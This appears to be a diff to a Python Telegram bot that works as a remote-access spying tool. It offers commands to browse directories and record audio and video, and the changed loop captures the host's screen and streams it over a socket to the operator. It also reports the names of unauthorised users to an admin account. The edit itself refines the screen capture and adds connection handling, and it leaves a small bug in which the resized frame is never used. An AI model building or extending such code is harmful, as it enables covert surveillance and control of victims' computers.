@@ -17,7 +17,6 @@ from telebot.types import KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemo
 from PIL import Image
 
 
-
 """ Variables """
 API_TOKEN = "token"
 ADMIN_ID = id
@@ -31,20 +30,21 @@ markup.add(KeyboardButton("cd"), KeyboardButton("chdir"),
         KeyboardButton("record_video"), KeyboardButton("get_video"),
         KeyboardButton("get_screen"))
 
+
 """ Fn """
 def checkID(ms):
-        if ms.from_user.id == ADMIN_ID:
-            return True
-        else:
-            info = f"""
-            Name - {ms.from_user.first_name}
-            Surname - {ms.from_user.last_name}
-            UserName - {ms.from_user.username}
-            Language - {ms.from_user.language_code}
-            """
-            bot.send_message(ADMIN_ID, "USED:")
-            bot.send_message(ADMIN_ID, info)
-            return False
+    if ms.from_user.id == ADMIN_ID:
+        return True
+    else:
+        info = f"""
+        Name - {ms.from_user.first_name}
+        Surname - {ms.from_user.last_name}
+        UserName - {ms.from_user.username}
+        Language - {ms.from_user.language_code}
+        """
+        bot.send_message(ADMIN_ID, "USED:")
+        bot.send_message(ADMIN_ID, info)
+        return False
 
 def create_markup():
     markup = ReplyKeyboardMarkup()
@@ -81,7 +81,7 @@ def recordAUDIO(self, time=6):
         wf.setframerate(self.sample_rate)
 
         wf.writeframes(b"".join(frames))
-        
+
         wf.close()
 
 """ Functional """
@@ -318,12 +318,21 @@ class Client:
 
                         bot.send_message(ADMIN_ID, "Successful connection ✅")
                         while True:
-                            image = pyautogui.screenshot()
-                            image = image.resize((1440, 900))
-                            image = np.array(image)
-                            img = Image.frombytes('RGB', (1440, 900), image)
-                            data = pickle.dumps(np.array(img))
-                            clientsocket.sendall(struct.pack("L", len(data)) + data)
+                            screen = pyautogui.screenshot()
+                            frame = np.array(screen)
+                            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
+                            image = cv2.resize(frame, (1024, 576), interpolation=cv2.INTER_AREA)
+                            result, frame = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 90])
+                            data = pickle.dumps(frame, 0)
+                            
+                            try:
+                                clientsocket.sendall(struct.pack(">L", len(data)) + data)
+                            except ConnectionResetError:
+                                self.__running = False
+                            except ConnectionAbortedError:
+                                self.__running = False
+                            except BrokenPipeError:
+                                self.__running = False
                             
                     except Exception as e:
                         bot.send_message(ADMIN_ID, f"Error:\n{e}")
